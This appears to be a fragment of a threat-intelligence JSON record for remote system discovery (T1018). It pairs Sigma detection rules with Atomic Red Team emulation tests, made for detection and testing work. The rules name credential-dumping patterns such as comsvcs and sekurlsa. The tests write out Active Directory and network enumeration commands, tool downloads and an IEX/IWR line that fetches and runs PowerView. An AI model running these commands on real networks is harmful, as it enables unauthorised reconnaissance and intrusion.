+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/17\ndescription: Detects certain parent child patterns found in cases in which a webshell\n  is used to perform certain credential dumping or exfiltration activities on a compromised\n  system\ndetection:\n  condition: 1 of selection_webserver* and 1 of selection_child*\n  selection_child_1:\n    CommandLine|contains|all:\n    - rundll32\n    - comsvcs\n  selection_child_2:\n    CommandLine|contains|all:\n    - ' -hp'\n    - ' a '\n    - ' -m'\n  selection_child_3:\n    CommandLine|contains|all:\n    - net\n    - ' user '\n    - ' /add'\n  selection_child_4:\n    CommandLine|contains|all:\n    - net\n    - ' localgroup '\n    - ' administrators '\n    - /add\n  selection_child_5:\n    Image|endswith:\n    - \\ntdsutil.exe\n    - \\ldifde.exe\n    - \\adfind.exe\n    - \\procdump.exe\n    - \\Nanodump.exe\n    - \\vssadmin.exe\n    - \\fsutil.exe\n  selection_child_6:\n    CommandLine|contains:\n    - ' -NoP '\n    - ' -W Hidden '\n    - ' -decode '\n    - ' /decode '\n    - 'reg save '\n    - .downloadstring(\n    - .downloadfile(\n    - FromBase64String\n    - ' /ticket:'\n    - ' sekurlsa'\n    - .dmp full\n    - process call create\n    - whoami /priv\n  selection_webserver_characteristics_tomcat1:\n    ParentImage|contains:\n    - -tomcat-\n    - \\tomcat\n    ParentImage|endswith:\n    - \\java.exe\n    - \\javaw.exe\n  selection_webserver_characteristics_tomcat2:\n    CommandLine|contains:\n    - catalina.jar\n    - CATALINA_HOME\n    ParentImage|endswith:\n    - \\java.exe\n    - \\javaw.exe\n  selection_webserver_image:\n    ParentImage|endswith:\n    - \\w3wp.exe\n    - \\php-cgi.exe\n    - \\nginx.exe\n    - \\httpd.exe\n    - \\caddy.exe\n    - \\ws_tomcatservice.exe\nfalsepositives:\n- Unlikely\nid: 4ebc877f-4612-45cb-b3a5-8e3834db36c9\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/04\nreferences:\n- https://youtu.be/7aemGhaE9ds?t=641\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1505.003\n- attack.t1018\n- attack.t1033\n- attack.t1087\ntitle: Webshell Hacking Activity Patterns\n",
+                            "sigma:id": "4ebc877f-4612-45cb-b3a5-8e3834db36c9",
+                            "title": "Webshell Hacking Activity Patterns",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "75df3b17-8bcc-4565-b89b-c9898acef911",
+                        "lookup_data": {
+                            "description": "Detects the execution of a AdFind for Active Directory enumeration",
+                            "raw": "author: FPT.EagleEye Team, omkar72, oscd.community\ndate: 2020/09/26\ndescription: Detects the execution of a AdFind for Active Directory enumeration\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - objectcategory\n    - trustdmp\n    - dcmodes\n    - dclist\n    - computers_pwdnotreqd\n    Image|endswith: \\adfind.exe\nfalsepositives:\n- Administrative activity\nid: 75df3b17-8bcc-4565-b89b-c9898acef911\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/05/12\nreferences:\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md\n- https://thedfirreport.com/2020/05/08/adfind-recon/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Suspicious AdFind Execution\n",
+                            "sigma:id": "75df3b17-8bcc-4565-b89b-c9898acef911",
+                            "title": "Suspicious AdFind Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
+                        "lookup_data": {
+                            "description": "Interesting Recon Script",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e55be1a-3a30-48ae-9934-4199950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1582912038",
+                            "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160",
+                        "lookup_data": {
+                            "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\nUsee to Query/modify DNS records for Active Directory integrated DNS via LDAP\n",
+                            "raw": "author: frack113\ndate: 2022/01/01\ndescription: 'This tool enables enumeration and exporting of all DNS records in the\n  zone for recon purposes of internal networks Python 3 and python.exe must be installed,\n\n  Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: adidnsdump\n    Image|endswith: \\python.exe\nfalsepositives:\n- Unknown\nid: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\ntitle: Suspicious Execution of Adidnsdump\n",
+                            "sigma:id": "26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160",
+                            "title": "Suspicious Execution of Adidnsdump",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                        "lookup_data": {
+                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
+                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1674763285",
+                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1018",
+                "display_name": "Remote System Discovery",
+                "atomic_tests": [
+                    {
+                        "name": "Remote System Discovery - net",
+                        "auto_generated_guid": "85321a9c-897f-4a60-9f20-29788e50bccd",
+                        "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net view /domain\nnet view\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - net group Domain Computers",
+                        "auto_generated_guid": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f",
+                        "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net group \"Domain Computers\" /domain\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - nltest",
+                        "auto_generated_guid": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8",
+                        "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "target_domain": {
+                                "description": "Domain to query for domain controllers",
+                                "type": "string",
+                                "default": "%userdnsdomain%"
+                            }
+                        },
+                        "executor": {
+                            "command": "nltest.exe /dclist:#{target_domain}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - ping sweep",
+                        "auto_generated_guid": "6db1f57f-d1d5-4223-8a66-55c9c65a9592",
+                        "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "start_host": {
+                                "description": "Last octet starting value for ping sweep.",
+                                "type": "string",
+                                "default": "1"
+                            },
+                            "stop_host": {
+                                "description": "Last octet ending value for ping sweep.",
+                                "type": "string",
+                                "default": "254"
+                            },
+                            "subnet": {
+                                "description": "Subnet used for ping sweep.",
+                                "type": "string",
+                                "default": "192.168.1"
+                            }
+                        },
+                        "executor": {
+                            "command": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - arp",
+                        "auto_generated_guid": "2d5a61f5-0447-4be4-944a-1f8530ed6574",
+                        "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "arp -a\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - arp nix",
+                        "auto_generated_guid": "acb6b1ff-e2ad-4d64-806c-6c35fe73b951",
+                        "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if arp command exists on the machine\n",
+                                "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "arp -a | grep -v '^?'\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - sweep",
+                        "auto_generated_guid": "96db2632-8417-4dbb-b8bb-a8b92ba391de",
+                        "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "start_host": {
+                                "description": "Subnet used for ping sweep.",
+                                "type": "string",
+                                "default": "1"
+                            },
+                            "stop_host": {
+                                "description": "Subnet used for ping sweep.",
+                                "type": "string",
+                                "default": "254"
+                            },
+                            "subnet": {
+                                "description": "Subnet used for ping sweep.",
+                                "type": "string",
+                                "default": "192.168.1"
+                            }
+                        },
+                        "executor": {
+                            "command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - nslookup",
+                        "auto_generated_guid": "baa01aaa-5e13-45ec-8a0d-e46c93c9760f",
+                        "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - adidnsdump",
+                        "auto_generated_guid": "95e19466-469e-4316-86d2-1dc401b5a959",
+                        "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "user_name": {
+                                "description": "username including domain.",
+                                "type": "string",
+                                "default": "domain\\user"
+                            },
+                            "acct_pass": {
+                                "description": "Account password.",
+                                "type": "string",
+                                "default": "password"
+                            },
+                            "host_name": {
+                                "description": "hostname or ip address to connect to.",
+                                "type": "string",
+                                "default": "192.168.1.1"
+                            },
+                            "venv_path": {
+                                "description": "Path to the folder for the tactics venv",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1018"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must have python 3 installed\n",
+                                "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
+                            },
+                            {
+                                "description": "Computer must have venv configured at #{venv_path}\n",
+                                "prereq_command": "if (Test-Path -Path \"#{venv_path}\" ) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
+                            },
+                            {
+                                "description": "adidnsdump must be installed\n",
+                                "prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\adidnsdump\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir adidnsdump 2>&1 | Out-Null\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{venv_path}\\Scripts\\adidnsdump\" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Adfind - Enumerate Active Directory Computer Objects",
+                        "auto_generated_guid": "a889f5be-2d54-4050-bd05-884578748bb4",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) #{optional_args}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Adfind - Enumerate Active Directory Domain Controller Objects",
+                        "auto_generated_guid": "5838c31e-a0e2-4b9f-b60a-d79d2cb7995e",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -sc dclist\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - ip neighbour",
+                        "auto_generated_guid": "158bd4dd-6359-40ab-b13c-285b9ef6fa25",
+                        "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if ip command exists on the machine\n",
+                                "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "apt-get install iproute2 -y\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "ip neighbour show\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - ip route",
+                        "auto_generated_guid": "1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1",
+                        "description": "Use the ip route command to display the kernels routing tables. \n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if ip command exists on the machine\n",
+                                "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "apt-get install iproute2 -y\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "ip route show\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - netstat",
+                        "auto_generated_guid": "d2791d72-b67f-4615-814f-ec824a91f514",
+                        "description": "Use the netstat command to display the kernels routing tables.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "command": "netstat -r | grep default\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - ip tcp_metrics",
+                        "auto_generated_guid": "6c2da894-0b57-43cb-87af-46ea3b501388",
+                        "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if ip command exists on the machine\n",
+                                "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "apt-get install iproute2 -y\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Enumerate domain computers within Active Directory using DirectorySearcher",
+                        "auto_generated_guid": "962a6017-1c09-45a6-880b-adc9c57cb22e",
+                        "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "This PC must be joined to a domain.",
+                                "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}",
+                                "get_prereq_command": "write-host \"This PC must be manually added to a domain.\" "
+                            }
+                        ],
+                        "executor": {
+                            "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Enumerate Active Directory Computers with Get-AdComputer",
+                        "auto_generated_guid": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf",
+                        "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "Get-AdComputer -Filter *\n"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Active Directory Computers with ADSISearcher",
+                        "auto_generated_guid": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d",
+                        "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n"
+                        }
+                    },
+                    {
+                        "name": "Get-DomainController with PowerView",
+                        "auto_generated_guid": "b9d2e8ca-5520-4737-8076-4f08913da2c4",
+                        "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Get-WmiObject to Enumerate Domain Controllers",
+                        "auto_generated_guid": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad",
+                        "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }\ncatch { $_; exit $_.Exception.HResult }\n"
+                        }
+                    },
+                    {
+                        "name": "Remote System Discovery - net group Domain Controller",
+                        "auto_generated_guid": "5843529a-5056-4bc1-9c13-a311e2af4ca0",
+                        "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net group /domain \"Domain controllers\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Remote Hosts with Netscan",
+                        "auto_generated_guid": "b8147c9a-84db-4ec1-8eee-4e0da75f0de5",
+                        "description": "This test uses Netscan to identify remote hosts in a specified network range.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "netscan_path": {
+                                "description": "NetScan exe location",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe"
+                            },
+                            "range_to_scan": {
+                                "description": "The IP range to scan with Netscan",
+                                "type": "string",
+                                "default": "127.0.0.1-127.0.0.1"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Netscan must be installed\n",
+                                "prereq_command": "if (Test-Path \"#{netscan_path}\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan.zip\" \"https://www.softperfect.com/download/files/netscan_portable.zip\"\nExpand-Archive -LiteralPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "cmd /c '#{netscan_path}' /hide /auto:\"$env:temp\\T1018NetscanOutput.txt\" /range:'#{range_to_scan}'",
+                            "cleanup_command": "remove-item \"$env:temp\\T1018NetscanOutput.txt\" -force -erroraction silentlycontinue\n",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 10:54:57"
+}
